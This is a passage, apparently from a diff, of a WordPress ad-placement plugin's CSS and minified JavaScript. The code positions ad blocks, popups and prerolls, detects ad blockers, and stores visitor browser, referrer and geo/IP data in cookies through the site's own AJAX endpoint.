+[data-fpm-type="outgoing"].fpm-show.right-bottom{transform:translateX(0)}
+
+.fpm-overlay{position:fixed;width:100%;height:100%;pointer-events:none;top:0;left:0;z-index:1000;opacity:0;background:#0000008a;transition:all 300ms ease;-webkit-backdrop-filter:blur(0px);backdrop-filter:blur(0px)}
+[data-fpm-type="outgoing"].center.fpm-show ~ .fpm-overlay{opacity:1;pointer-events:all}
+.fpm-fixed{position:fixed;z-index:50}
+.fpm-stop{position:relative;z-index:50}
+.fpm-preroll{position:relative;overflow:hidden;display:block}
+.fpm-preroll.hasIframe{padding-bottom:56.25%;height:0}
+.fpm-preroll iframe{display:block;width:100%;height:100%;position:absolute}
+.fpm-preroll_flex{display:flex;align-items:center;justify-content:center;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);opacity:0;transition:opacity .35s ease;z-index:2}
+.fpm-preroll_flex.fpm-show{opacity:1}
+.fpm-preroll_flex.fpm-hide{pointer-events:none;z-index:-1}
+.fpm-preroll_item{position:relative;max-width:calc(100% - 68px);max-height:100%;z-index:-1;pointer-events:none;cursor:default}
+.fpm-preroll_flex.fpm-show .fpm-preroll_item{z-index:3;pointer-events:all}
+.fpm-preroll_flex .fpm-timer,
+.fpm-preroll_flex .fpm-cross{top:10px!important;right:10px!important}
+.fpm-preroll_hover{position:absolute;top:0;left:0;right:0;bottom:0;width:100%;height:100%;z-index:2}
+.fpm-preroll_flex:not(.fpm-show) .fpm-preroll_hover{cursor:pointer}
+.fpm-hoverroll{position:relative;overflow:hidden;display:block}
+.fpm-hoverroll_item{position:absolute;bottom:0;left:50%;margin:auto;transform:translateY(100%) translateX(-50%);transition:all 300ms ease;z-index:1000;max-height:100%}
+
+.fpm-preroll_item [id*="yandex_rtb_"],
+.fpm-hoverroll_item [id*="yandex_rtb_"]{min-width:160px}
+
+.fpm-hoverroll:hover .fpm-hoverroll_item:not(.fpm-hide){transform:translateY(0) translateX(-50%)}
+.fpm-slider{display:grid}
+.fpm-slider > *{grid-area:1/1;margin:auto;opacity:0;transform:translateX(200px);transition:all 420ms ease;pointer-events:none;width:100%;z-index:0}
+.fpm-slider > *.fpm-hide{transform:translateX(-100px)!important;opacity:0!important;z-index:0!important}
+.fpm-slider > *.fpm-show{transform:translateX(0);pointer-events:all;opacity:1;z-index:1}
+.fpm-slider .fpm-timeline{width:100%;height:2px;background:#f6f5ff;position:relative}
+.fpm-slider .fpm-timeline:after{content:'';position:absolute;background:#d5ceff;height:100%;transition:all 300ms ease;width:0}
+.fpm-slider > *.fpm-show .fpm-timeline:after{animation:timeline var(--duration) ease}
+.fpm-slider > *:hover .fpm-timeline:after{animation:timeline-hover}
+@keyframes timeline-hover{}
+@keyframes timeline{0% {width:0}100% {width:100%}}
+</style>
+</noscript>
+<!--/noptimize-->
+
+
+<!--noptimize-->
+<script data-noptimize="" data-wpfc-render="false">
+fpm_settings.selector="true"===fpm_settings.sidebar?fpm_settings.selector:".fpm_end",!NodeList.prototype.forEach&&Array.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),window.yaContextCb=window.yaContextCb||[],window.fpm_shuffleArray=function(e){for(var t=e.length-1;0<t;t--){var r=Math.floor(Math.random()*(t+1)),n=e[t];e[t]=e[r],e[r]=n}return e},window.fpm_queryAll=function(t,e,r){try{r="true"===(r=r||"true");var n=!1;["!>","!","!^","!~","!+",":after(",":after-sibling(",":before(",":before-sibling(",":contains(",":icontains(",":starts-with(",":istarts-with(",":ends-with(",":iends-with(",":first(",":has(",":has-sibling("].forEach(function(e){t.includes(e)&&(n=!0)});var o=[];if(n){if(!e)return[];for(var i=document.evaluate(e,document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null),a=0,s=i.snapshotLength;a<s;a++)o.push(i.snapshotItem(a))}else o=Array.from(document.querySelectorAll(t));return r||(o=o.filter(function(e){return fpm_user.until_child.includes(e)})),o}catch(e){return fpm_user.debug&&console.log(e),[]}},window.fpm_debug=function(e,t){fpm_user.debug&&(t=t||"the reason is not established",console.log("%cID: "+e,"color: white; background: #ec5555"),console.log("URL: "+window.fpm_settings.ajaxUrl.replace("admin-ajax.php","")+"admin.php?page=fpm_blocks&id="+e),console.log("Reason: "+t),console.log("=".repeat(27)))},window.fpm_ajax=function(e,t){t=t||[];var r=new XMLHttpRequest;r.onreadystatechange=function(){var e;r.readyState==XMLHttpRequest.DONE&&(200==r.status?(e=JSON.parse(r.responseText),fpm_body.classList.remove(e.method),"block_geo_role_ip"===e.method?(fpm_user.ccode=e.data.ccode,fpm_user.country=e.data.country,fpm_user.city=e.data.city,fpm_user.ip=e.data.ip,!fpm_user.testcook||"administrator"===e.data.role&&"editor"===e.data.role||(fpm_setCookie("fpm_ccode",e.data.ccode),fpm_setCookie("fpm_country",e.data.country),fpm_setCookie("fpm_city",e.data.city),fpm_setCookie("fpm_ip",e.data.ip),fpm_setCookie("fpm_isp",e.data.isp),fpm_setCookie("fpm_role",e.data.role)),fpm_async_then("ajax")):(fpm_user.debug&&console.log("ajax error:"),console.error("method was wrong"))):(fpm_user.debug&&console.log("ajax error:"),console.error("php returned error")))},r.open("POST",fpm_settings.ajaxUrl+"?"+flatPM_serialize({action:"flat_pm_ajax",data_me:{meta:{method:e,arr:t}}}),!0),r.send()},window.fpm_on=function(e,t,r,n,o){o=o||!1,e.addEventListener(t,function(e){for(var t=e.target;t&&t!==this;)t.matches(r)&&n.call(t,e),t=t.parentNode},{once:o})},window.fpm_contentsUnwrap=function(e){for(var t=e.parentNode;e.firstChild;)t.insertBefore(e.firstChild,e);t.removeChild(e)},window.fpm_wrap=function(e,t){e.parentNode.insertBefore(t,e),t.appendChild(e)},window.fpm_until=function(e,t,r,n){n=n||"nextElementSibling";var o=[];if(!e)return o;for(o.push(e),e=e[n];e&&(o.push(e),!e.matches(t));)e=(r&&e.matches(r),e[n]);return o},window.fpm_findSelector=function(e,t){var r=[];return t&&(e=e||[]).forEach(function(e){e.matches(t)&&r.push(e);e=e.querySelectorAll(t);e&&0<e.length&&(r=r.concat([...e]))}),r},window.fpm_toNodeList=function(e){var t=document.createDocumentFragment();return e.forEach(function(e){t.appendChild(e.cloneNode())}),t},window.fpm_jsonp=function(e,t){var r="jsonp_callback_"+Math.round(1e5*Math.random());window[r]=function(e){delete window[r],fpm_body.removeChild(n),t(e)};var n=document.createElement("script");n.src=e+(0<=e.indexOf("?")?"&":"?")+"callback="+r,fpm_body.appendChild(n)},window.flatPM_serialize=function(e,t){var r,n,o,i=[];for(r in e)e.hasOwnProperty(r)&&(n=t?t+"["+r+"]":r,o=e[r],i.push(null!==o&&"object"==typeof o?flatPM_serialize(o,n):encodeURIComponent(n)+"="+encodeURIComponent(o)));return i.join("&")},document.write=function(e){var t=document.createElement("div");document.currentScript.insertAdjacentElement("afterend",t),fpm_setHTML(t,e),fpm_stack_scripts.block||(fpm_stack_scripts.block=!0,fpm_setSCRIPT()),fpm_contentsUnwrap(t)},window.fpm_sticky=function(e,a,t){var s=e,l=null,d=t=t||0;function r(){if(null==l){for(var e=getComputedStyle(s,""),t="",r=0;r<e.length;r++)0!=e[r].indexOf("overflow")&&0!=e[r].indexOf("padding")&&0!=e[r].indexOf("border")&&0!=e[r].indexOf("outline")&&0!=e[r].indexOf("box-shadow")&&0!=e[r].indexOf("background")||(t+=e[r]+": "+e.getPropertyValue(e[r])+"; ");(l=document.createElement("div")).style.cssText=t+" box-sizing: border-box; width: "+s.offsetWidth+"px;",s.insertBefore(l,s.firstChild);for(var n=s.childNodes.length,r=1;r<n;r++)l.appendChild(s.childNodes[1]);s.style.padding="0",s.style.border="0"}s.style.height=l.getBoundingClientRect().height+"px";var o=s.getBoundingClientRect(),i=Math.round(o.top+l.getBoundingClientRect().height-a.getBoundingClientRect().bottom);o.top-d<=0?o.top-d<=i?(l.className=fpm_attr.stop,l.style.top=-i+"px"):(l.className=fpm_attr.fixed,l.style.top=d+"px"):(l.className="",l.style.top=""),window.addEventListener("resize",function(){s.children[0].style.width=getComputedStyle(s,"").width},!1)}window.addEventListener("scroll",r,!1),fpm_body.addEventListener("scroll",r,!1),r()},window.fpm_addDays=function(e,t){var r=60*e.getTimezoneOffset()*1e3,n=e.getTime(),e=new Date;return n+=864e5*t,e.setTime(n),r!=(t=60*e.getTimezoneOffset()*1e3)&&(n+=t-r,e.setTime(n)),e},window.fpm_adbDetect=function(){var e=document.createElement("ins");e.id="adsense",e.classList.add("adsbygoogle"),e.setAttribute("data-tag","flat_pm"),e.style="position:absolute;left:-9999px;top:-9999px",e.innerHTML="Adblock<br>detector",fpm_body.insertAdjacentElement("afterbegin",e);var t=document.querySelector('#adsense.adsbygoogle[data-tag="flat_pm"]');if(!t)return!0;t=t.currentStyle||window.getComputedStyle(t,""),t=parseInt(t.height);return e.remove(),!(!isNaN(t)&&0!=t)},window.fpm_setCookie=function(e,t,r){var n,o=(r=r||{path:"/"}).expires;"number"==typeof o&&o&&((n=new Date).setTime(n.getTime()+1e3*o),o=r.expires=n),o&&o.toUTCString&&(r.expires=o.toUTCString());var i,a=e+"="+(t=encodeURIComponent(t));for(i in r){a+="; "+i;var s=r[i];!0!==s&&(a+="="+s)}document.cookie=a},window.fpm_getCookie=function(r){var e=document.cookie.split("; ").reduce(function(e,t){t=t.split("=");return t[0]===r?decodeURIComponent(t[1]):e},"");return""!=e?e:void 0},window.flatPM_testCookie=function(){var e="test_56445";try{return localStorage.setItem(e,e),localStorage.removeItem(e),!0}catch(e){return!1}},window.fpm_randomString=function(e){for(var t="",r="abcdefghijklmnopqrstuvwxyz",n=r.length,o=0;o<e;o++)t+=r.charAt(Math.floor(Math.random()*n));return t},window.fpm_randomProperty=function(e){e=Object.keys(e);return e[Math.floor(Math.random()*e.length)]},window.fpm_random=function(e,t){return Math.floor(Math.random()*(t-e+1))+e},window.flatPM_sanitizeUrlParams=function(e){return e&&["__proto__","constructor","prototype"].includes(e.toLowerCase())?e.toUpperCase():e},window.fpm_getUrlParams=function(e){var t={};e=e||window.location.href;e=(e=flatPM_sanitizeUrlParams(e))?e.split("?")[1]:window.location.search.slice(1);if(e)for(var r=(e=e.split("#")[0]).split("&"),n=0;n<r.length;n++){var o,i=r[n].split("="),a=i[0],s=void 0===i[1]||i[1],a=a.toLowerCase();"string"==typeof s&&(s=s.toLowerCase()),a.match(/\[(\d+)?\]$/)?(t[o=a.replace(/\[(\d+)?\]/,"")]||(t[o]=[]),a.match(/\[\d+\]$/)?(i=/\[(\d+)\]/.exec(a)[1],t[o][i]=s):t[o].push(s)):t[a]?(t[a]&&"string"==typeof t[a]&&(t[a]=[t[a]]),t[a].push(s)):t[a]=s}return t},window.fpm_dynamicInterval=function(e,t,r,n,o){t.autorefresh&&"0"!==t.autorefresh&&setTimeout(function(){e.innerHTML="",n<=++o&&(o=0),t=r[o],fpm_pre_setHTML(e,t.code),fpm_dynamicInterval(e,t,r,n,o)},1e3*t.autorefresh)},flatPM_testCookie()&&fpm_setCookie("fpm_visit",(parseInt(fpm_getCookie("fpm_visit"))||0)+1),window.fpm_stack_scripts={scripts:[],block:!1},window.fpm_then={ajax:[],load:[]},window.fpm_titles="h1,h2,h3,h4,h5,h6",window.fpm_date=new Date,window.fpm_dateYear=fpm_date.getFullYear(),window.fpm_dateMonth=2==(fpm_date.getMonth()+1+"").length?fpm_date.getMonth()+1:"0"+(fpm_date.getMonth()+1),window.fpm_dateWeek=0===fpm_date.getDay()?6:fpm_date.getDay()-1,window.fpm_dateUTCWeek=0===fpm_date.getUTCDay()?6:fpm_date.getUTCDay()-1,window.fpm_dateDay=2==(fpm_date.getDate()+"").length?fpm_date.getDate():"0"+fpm_date.getDate(),window.fpm_dateHours=2==(fpm_date.getHours()+"").length?fpm_date.getHours():"0"+fpm_date.getHours(),window.fpm_dateUTCHours=fpm_date.getUTCHours(),window.fpm_dateMinutes=2==(fpm_date.getMinutes()+"").length?fpm_date.getMinutes():"0"+fpm_date.getMinutes();var prop,fpm_modul=fpm_queryAll("noscript#fpm_modul"),fpm_modul_text="";for(prop in 0<fpm_modul.length&&(fpm_modul_text=fpm_modul[0].outerText,fpm_modul[0].remove()),window.fpm_attr={id:"",type:"",inner:"",status:"",async:"",modal:"",overlay:"",timer:"",cross:"",out:"",fixed:"",stop:"",preroll:"",hoverroll:"",show:"",hide:"",done:"",slider:"",timeline:""},fpm_modul_text=(fpm_modul_text=fpm_modul_text.replace("<style>","")).replace("</style>",""),fpm_attr){fpm_attr[prop]=fpm_randomString(10);var regex=new RegExp("fpm-"+prop,"g"),fpm_modul_text=fpm_modul_text.replace(regex,fpm_attr[prop])}document.head.insertAdjacentHTML("beforeend","<style>"+fpm_modul_text+"</style>"),window.fpm_user={init:function(){window.fpm_body=window.fpm_body||document.querySelector("body"),this.fpm_end=document.querySelectorAll(".fpm_end"),this.fpm_end=this.fpm_end[this.fpm_end.length-1],this.fpm_start=document.querySelector(".fpm_start"),this.testcook=flatPM_testCookie(),this.browser=this.searchString(this.dataBrowser)||!1,this.os=this.searchString(this.dataOS)||!1,this.referer=this.cookieReferer(),this.winwidth=window.innerWidth,this.date=fpm_dateYear+"-"+fpm_dateMonth+"-"+fpm_dateDay,this.time=fpm_dateHours+":"+fpm_dateMinutes,this.adb=fpm_adbDetect(),this.until=fpm_until(this.fpm_start,".fpm_end"),this.textlen=this.until.map(function(e){return e.outerText}).join().replace(/(\s)+/g,"").length,this.titlelen=fpm_toNodeList(this.until).querySelectorAll(fpm_titles).length,this.country=this.cookieData("country"),this.city=this.cookieData("city"),this.ccode=this.cookieData("ccode"),this.role=this.cookieData("role"),this.isp=this.cookieData("isp"),this.ip=this.cookieData("ip"),this.agent=navigator.userAgent,this.until_child=this.until.map(function(e){return[e,Array.from(e.querySelectorAll("*"))]}).flat(1/0),this.debug=fpm_getUrlParams()["fpm-debug"]},cookieReferer:function(){return parent!==window?"///:iframe":fpm_user.testcook?(void 0===fpm_getCookie("fpm_referer")&&fpm_setCookie("fpm_referer",""!=document.referrer?document.referrer:"///:direct"),fpm_getCookie("fpm_referer")):""!=document.referrer?document.referrer:"///:direct"},cookieData:function(e){return fpm_user.testcook&&void 0!==fpm_getCookie("fpm_"+e)?fpm_getCookie("fpm_"+e):""},searchString:function(e){for(var t=e.length,r=0;r<t;r++){var n=e[r].str;if(n&&e[r].subStr.test(n))return e[r].id}},dataBrowser:[{str:navigator.userAgent,subStr:/YaBrowser/,id:"YaBrowser"},{str:navigator.vendor,subStr:/Apple/,id:"Safari"},{str:navigator.userAgent,subStr:/OPR/,id:"Opera"},{str:navigator.userAgent,subStr:/Firefox/,id:"Firefox"},{str:navigator.userAgent,subStr:/Edge/,id:"Edge"},{str:navigator.userAgent,subStr:/Chrome/,id:"Chrome"}],dataOS:[{str:navigator.platform,subStr:/Win/,id:"Windows"},{str:navigator.platform,subStr:/Mac/,id:"Mac"},{str:navigator.platform,subStr:/(iPhone|iPad|iPod)/,id:"iPhone"},{str:navigator.platform,subStr:/Linux/,id:"Linux"}]},window.fpm_offsetTop_with_exeptions=function(n){return n=n||"",window.exeptions_offsetTop=window.exeptions_offsetTop||[],window.exeptions_offsetTop[n]||(window.exeptions_offsetTop[n]=fpm_user.until.map(function(e){var t=Array.from(e.querySelectorAll("*")),r=[];return""!=n&&(r=Array.from(e.querySelectorAll(n)),t=t.filter(function(e){return!r.includes(e)})),[e,t]}).flat(1/0).map(function(e){return{el:e,offset:Math.round(e.getBoundingClientRect().top-fpm_user.fpm_start.getBoundingClientRect().top)}}),window.exeptions_offsetTop[n])},window.fpm_textLength_with_exeptions=function(i){if(i=i||"",window.exeptions_textLength=window.exeptions_textLength||[],window.exeptions_textLength[i])return window.exeptions_textLength[i];var a=0;return window.exeptions_textLength[i]=fpm_user.until.map(function(e){if("SCRIPT"==e.tagName)return[];var t=Array.from(e.querySelectorAll("*")),r=[];""!=i&&(r=Array.from(e.querySelectorAll(i)),t=t.filter(function(e){return!r.includes(e)}));var n=0,o=e.outerText.replace(/(\s)+/g,"").length;return 0<t.length&&t.forEach(function(e){void 0!==e.outerText&&"SCRIPT"!=e.tagName&&(a+=n,n+=e.outerText.replace(/(\s)+/g,"").length),e.fpm_textLength=a}),a+=o-n,e.fpm_textLength=a,[e,t]}).flat(1/0),window.exeptions_textLength[i]},/zen.yandex/.test(fpm_getUrlParams().utm_referrer)&&(fpm_setCookie("fpm_referer","zen.yandex"),fpm_user.referer="zen.yandex"),window.fpm_async_then=function(e){var t=fpm_then[e].length;if(0!=t)for(var r=0;r<t;r++){var n=fpm_then[e][r];fpm_next(n)}else fpm_then[e]=[]},window.flatPM_persentWrapper=function(e,r,t){var n=0,o=!1;return e.forEach(function(e){var t=e.outerText.replace(/(\s)+/g,"");n<r&&(n+=t.length,o=e)}),o},window.fpm_textLength_between=function(e,t,r){var n=e,o=0,i=e.outerText.length,a="data-"+fpm_attr.id;(r=r||!1)&&(o=e.outerText.length,i=0);e:do{for(var s=e;null!==s.previousElementSibling;){if((s=s.previousElementSibling).hasAttribute(a))break e;if(s.previousElementSibling===fpm_user.fpm_start){o=1e8;break e}if(0<(l=s.querySelectorAll("[data-"+fpm_attr.id+"]")).length){l=l[l.length-1];do{for(;null!==l.nextElementSibling;)o+=(l=l.nextElementSibling).outerText.length}while((l=l.parentNode)!==s);break}if(t<=(o+=s.outerText.length))break e}}while(e=e.parentNode,e!==fpm_user.fpm_start.parentNode);e=n;e:do{for(var l,s=e;null!==s.nextElementSibling;){if((s=s.nextElementSibling).hasAttribute(a))break e;if(s.nextElementSibling===fpm_user.fpm_end){i=1e8;break e}if(0<(l=s.querySelectorAll("[data-"+fpm_attr.id+"]")).length){l=l[0];do{for(;null!==l.previousElementSibling;)i+=(l=l.previousElementSibling).outerText.length}while((l=l.parentNode)!==s);break}if(t<=(i+=s.outerText.length))break e}}while(e=e.parentNode,e!==fpm_user.fpm_start.parentNode);return t<=o&&t<=i},window.fpm_render_pixel_ads=function(e,t){var r,n,o,i,a=fpm_user.fpm_end.getBoundingClientRect().top-fpm_user.fpm_start.getBoundingClientRect().top,s=fpm_offsetTop_with_exeptions(t.exclude);if((t.n=t.n&&0!=t.n?t.n:1,["percent_once","px_once","center"].includes(t.type)&&("percent_once"===t.type&&(n=Math.round(window.innerHeight/100*t.n)),"px_once"===t.type&&(n=+t.n),"center"===t.type&&(n=a/2),n<(i=200+a)&&(f=[...s].sort((e,t)=>Math.abs(n-e.offset)-Math.abs(n-t.offset)),o=s.find(function(e){return e.offset===f[0].offset}).el,t.m?(t.m=+t.m,fpm_textLength_between(o,t.m)&&o.insertAdjacentElement("beforebegin",e)):o.insertAdjacentElement("beforebegin",e))),["percent_iterable","px_iterable"].includes(t.type))&&("percent_iterable"===t.type&&(n=Math.round(window.innerHeight/100*t.n),r=t.start?Math.round(window.innerHeight/100*t.start):n),"px_iterable"===t.type&&(n=+t.n,r=t.start?+t.start:n),n<(i=200+a))){var l=i;t.max&&(l=Math.min(i,n*t.max+r));for(var d=r;d<l;){var f=[...s].sort((e,t)=>Math.abs(d-e.offset)-Math.abs(d-t.offset));o=s.find(function(e){return e.offset===f[0].offset}).el,t.m?(t.m=+t.m,fpm_textLength_between(o,t.m)&&o.insertAdjacentElement("beforebegin",e.cloneNode())):o.insertAdjacentElement("beforebegin",e.cloneNode()),d+=n}}},window.fpm_cross_timer=function(t,r,n){var e,o,i,a,s=null!==n.querySelector("."+fpm_attr.cross),l=null!==n.querySelector("."+fpm_attr.timer);"true"===r.cross&&((e=document.createElement("div")).classList.add(fpm_attr.cross),e.addEventListener("click",function(e){e.preventDefault(),fpm_close_event(t,r,n),n.classList.add(fpm_attr.hide),fpm_setCookie("fpm_outgoing_"+t.id,"true")})),r.timeout=parseInt(r.timeout)||0,"true"===r.timer&&0<r.timeout?((o=document.createElement("div")).classList.add(fpm_attr.timer),o.innerHTML=fpm_settings.timer_text+" <span>"+r.timeout+"</span>",i=o.querySelector("span"),l||n.appendChild(o),a=setInterval(function(){i.innerHTML=--r.timeout,r.timeout<=0&&(clearInterval(a),o.remove(),"true"===r.cross?s||n.appendChild(e):(fpm_close_event(t,r,n),n.classList.add(fpm_attr.hide)))},1e3)):"true"!==r.cross||s||n.appendChild(e)},window.fpm_close_event=function(e,t,r){r.classList.remove(fpm_attr.show),r.classList.contains("center")||setTimeout(function(){r.remove()},+fpm_settings.speed+100),t.again&&"true"===t.again&&(window.fpm_outgoing_counter=window.fpm_outgoing_counter||[],window.fpm_outgoing_counter[e.id]=window.fpm_outgoing_counter[e.id]||0,(!t.count||window.fpm_outgoing_counter[e.id]<t.count)&&setTimeout(function(){delete e.view.pixels,delete e.view.symbols,delete e.view.once,delete e.view.iterable,delete e.view.preroll,delete e.view.hoverroll,fpm_setWrap(e,!0),fpm_next(e)},t.interval?1e3*t.interval:0),window.fpm_outgoing_counter[e.id]++)},window.fpm_setWrap=function(a,e){e=e||!1;try{if(!e){var t,r,n=[],o=a.html.block,i=0,s=[];for(t in o)if((!o[t].minwidth||o[t].minwidth<=fpm_user.winwidth)&&(!o[t].maxwidth||o[t].maxwidth>=fpm_user.winwidth)){o[t].abgroup||(o[t].abgroup="0"),n[o[t].abgroup]||(n[o[t].abgroup]=[]);var l,d=fpm_user.adb&&(""!==o[t].adb.code||"true"!==fpm_settings.dublicate&&"footer"!==a.id&&"header"!==a.id)?o[t].adb:o[t].html;for(l in d.code=d.code.trim(),fpm_attr){var f=new RegExp("fpm-"+l,"g");fpm_modul_text=fpm_modul_text.replace(f,fpm_attr[l])}d.code&&n[o[t].abgroup].push(d)}for(r in n)0==n[r].length&&delete n[r];if(0==Object.keys(n).length)return void fpm_debug(a.id,"screen resolution");for(r in delete a.html.block,n)if("0"===r)for(var p in n[r])n[r][p].minheight&&(i+=+n[r][p].minheight);else s[r]=fpm_randomProperty(n[r]),i+=+n[r][s[r]].minheight;a.html.groups=n,a.html.start=s}var m=document.createElement("div");(a.user.geo||a.user.role||a.user.ip||a.user.isp)&&m.classList.add(fpm_attr.async),m.setAttribute("data-"+fpm_attr.id,a.id),m.setAttribute("data-"+fpm_attr.status,"processing"),m.style.minHeight=i+"px";var c=a.view.pixels;c&&null!==fpm_user.fpm_end&&null!==fpm_user.fpm_start&&((x=m.cloneNode()).setAttribute("data-"+fpm_attr.type,"pixels"),"processing"==document.readyState?document.addEventListener("load",function(){fpm_then.load.push(a),fpm_render_pixel_ads(x,c),fpm_async_then("load")}):fpm_render_pixel_ads(x,c));var u=a.view.symbols;if(u&&null!==fpm_user.fpm_end&&null!==fpm_user.fpm_start){(x=m.cloneNode()).setAttribute("data-"+fpm_attr.type,"symbols");var _,h,g=fpm_textLength_with_exeptions(u.exclude);if(u.n=u.n&&0!=u.n?u.n:1,["percent_once","symbol_once","center"].includes(u.type)&&("percent_once"===u.type&&(_=Math.round(fpm_user.textlen/100*u.n)),"symbol_once"===u.type&&(_=+u.n),"center"===u.type&&(_=fpm_user.textlen/2),w=fpm_user.textlen+100,_<w?(y=[...g].sort((e,t)=>Math.abs(_-e.fpm_textLength)-Math.abs(_-t.fpm_textLength)),h=g.find(function(e){return e.fpm_textLength===y[0].fpm_textLength}),u.m?(u.m=+u.m,fpm_textLength_between(h,u.m,!0)&&h.insertAdjacentElement("afterend",x)):h.insertAdjacentElement("afterend",x)):fpm_debug(a.id,"symbols offset")),["percent_iterable","symbol_iterable"].includes(u.type)){"percent_iterable"===u.type&&(_=Math.round(fpm_user.textlen/100*u.n),s=u.start?Math.round(fpm_user.textlen/100*u.start):_),"symbol_iterable"===u.type&&(_=+u.n,s=u.start?+u.start:_);var w=fpm_user.textlen+100;if(_<w){var v=w;u.max&&(v=Math.min(w,_*u.max+s));for(var b=s;b<v;){var y=[...g].sort((e,t)=>Math.abs(b-e.fpm_textLength)-Math.abs(b-t.fpm_textLength));h=g.find(function(e){return e.fpm_textLength===y[0].fpm_textLength}),u.m?(u.m=+u.m,fpm_textLength_between(h,u.m,!0)&&h.insertAdjacentElement("afterend",x.cloneNode())):h.insertAdjacentElement("afterend",x.cloneNode()),b+=_}}else fpm_debug(a.id,"symbols offset")}}w=a.view.once;w&&((x=m.cloneNode()).setAttribute("data-"+fpm_attr.type,"once"),C=fpm_queryAll(w.selector,w.xpath,w.document),w.n=+w.n||1,C.length>=w.n?("bottom"===w.derection&&C.reverse(),E="beforebegin","prepend"===w.insert_type&&(E="afterbegin"),"append"===w.insert_type&&(E="beforeend"),"after"===w.insert_type&&(E="afterend"),C[w.n-1].insertAdjacentElement(E,x)):fpm_debug(a.id,"once can't find element"));var x,L=a.view.iterable;if(L){(x=m.cloneNode()).setAttribute("data-"+fpm_attr.type,"iterable");var C=fpm_queryAll(L.selector,L.xpath,L.document);if(L.n=+L.n||1,L.start=+L.start||L.n,C.length>=L.n+L.start-1){"bottom"===L.derection&&C.reverse();var E="beforebegin";"prepend"===L.insert_type&&(E="afterbegin"),"append"===L.insert_type&&(E="beforeend"),"after"===L.insert_type&&(E="afterend");v=C.length;L.max&&(v=Math.min(C.length,L.n*L.max+L.start-L.n));for(b=L.start-1;b<v;b++)(b+1-L.start+L.n)%L.n==0&&C[b].insertAdjacentElement(E,x.cloneNode())}else fpm_debug(a.id,"iterable can't find element")}var k=a.view.outgoing;k&&("true"===k.cookie||"true"!==fpm_getCookie("fpm_outgoing_"+a.id)?((H=m.cloneNode()).setAttribute("data-"+fpm_attr.type,"outgoing"),H.classList.add(k.side),"sec"==k.type&&(A=function(){"true"===k.close&&(document.removeEventListener("visibilitychange",O),fpm_body.removeEventListener("mouseleave",O)),H.classList.add(fpm_attr.show),fpm_cross_timer(a,{...k},H),k.hide&&setTimeout(function(){fpm_close_event(a,k,H)},1e3*k.hide)},I=setTimeout(function(){A()},1e3*k.show)),["px","vh","%"].includes(k.type)&&(N=function(){("px"===k.type&&window.pageYOffset>k.show||"vh"===k.type&&window.pageYOffset>Math.round(window.innerHeight/100*k.show)||"%"===k.type&&window.pageYOffset>Math.round((fpm_body.scrollHeight-window.innerHeight)/100*k.show))&&P()},document.addEventListener("scroll",N)),"true"===k.close&&(O=function(e){("visibilitychange"===e.type&&document.hidden||"mouseleave"===e.type)&&(document.removeEventListener("visibilitychange",O),fpm_body.removeEventListener("mouseleave",O),"sec"==k.type&&(clearTimeout(I),A()),"px"==k.type&&P())},document.addEventListener("visibilitychange",O),fpm_body.addEventListener("mouseleave",O)),"true"===k.action&&k.selector&&fpm_on(fpm_body,"click",k.selector,function(e){"true"===k.close&&(document.removeEventListener("visibilitychange",O),fpm_body.removeEventListener("mouseleave",O)),"sec"==k.type&&(clearTimeout(I),A()),"px"==k.type&&P()}),fpm_body.insertAdjacentElement("afterbegin",H)):fpm_debug(a.id,"outgoing already displayed for this user"));var T=a.view.preroll;T&&(0<(S=fpm_queryAll(T.selector,T.xpath,"true")).length?S.forEach(function(e){var t,r,n,o,i;e.classList.contains(fpm_attr.done)||(e.classList.add(fpm_attr.done),t=document.createElement("span"),r=t.cloneNode(),n=t.cloneNode(),o=t.cloneNode(),t.classList.add(fpm_attr.preroll),(e.matches("iframe")||0<e.querySelectorAll("iframe").length)&&t.classList.add("hasIframe"),fpm_wrap(e,t),r.classList.add(fpm_attr.preroll+"_flex"),n.classList.add(fpm_attr.preroll+"_item"),o.classList.add(fpm_attr.preroll+"_hover"),n.appendChild(m.cloneNode()),r.appendChild(n),r.appendChild(o),t.appendChild(r),i=function(e){e.preventDefault(),fpm_cross_timer(a,{...T},r),r.classList.add(fpm_attr.show),o.removeEventListener("click",i),"true"===T.once&&document.querySelectorAll("."+fpm_attr.preroll+"_flex:not(."+fpm_attr.show+")").forEach(function(e){e.remove()})},o.addEventListener("click",i))}):fpm_debug(a.id,"preroll can't find element"));var M=a.view.hoverroll;M&&(0<(S=fpm_queryAll(M.selector,M.xpath,"true")).length?S.forEach(function(e){var t,r;e.classList.contains(fpm_attr.done)||(e.classList.add(fpm_attr.done),r=(t=document.createElement("span")).cloneNode(),t.classList.add(fpm_attr.hoverroll),fpm_wrap(e,t),r.classList.add(fpm_attr.hoverroll+"_item"),r.appendChild(m.cloneNode()),t.appendChild(r),"true"===M.cross&&fpm_cross_timer(a,{...M},r))}):fpm_debug(a.id,"hoverroll can't find element")),document.querySelectorAll(".fpm-short-"+a.id).forEach(function(e){var t=m.cloneNode();t.setAttribute("data-"+fpm_attr.type,"shortcode"),e.insertAdjacentElement("beforebegin",t),e.remove()})}catch(e){console.warn(e)}var S,A,I,N,O,H;function P(){var e;document.removeEventListener("scroll",N),"true"===k.close&&(document.removeEventListener("visibilitychange",O),fpm_body.removeEventListener("mouseleave",O)),H.classList.add(fpm_attr.show),fpm_cross_timer(a,{...k},H),k.hide&&(e=function(){window.pageYOffset>k.hide&&(fpm_close_event(a,k,H),document.removeEventListener("scroll",e))},document.addEventListener("scroll",e))}},window.fpm_afterObserver=function(i,a){var s,e=a.getAttribute("data-"+fpm_attr.type),t=getComputedStyle(a,"").minHeight;for(s in error=!1,i.groups){var l=i.groups[s];if("0"===s)for(var r in l)!function(){var e=l[r],t=document.createElement("div");t.classList.add(fpm_attr.inner),a.insertAdjacentElement("beforeend",t),e.timeout||e.autorefresh?(error=!0,setTimeout(function(){fpm_pre_setHTML(t,e.code),e.autorefresh&&"0"!==e.autorefresh&&setInterval(function(){t.innerHTML="",fpm_pre_setHTML(t,e.code)},1e3*e.autorefresh)},e.timeout?1e3*e.timeout:0)):(fpm_pre_setHTML(t,e.code),fpm_contentsUnwrap(t))}();else!function(){var 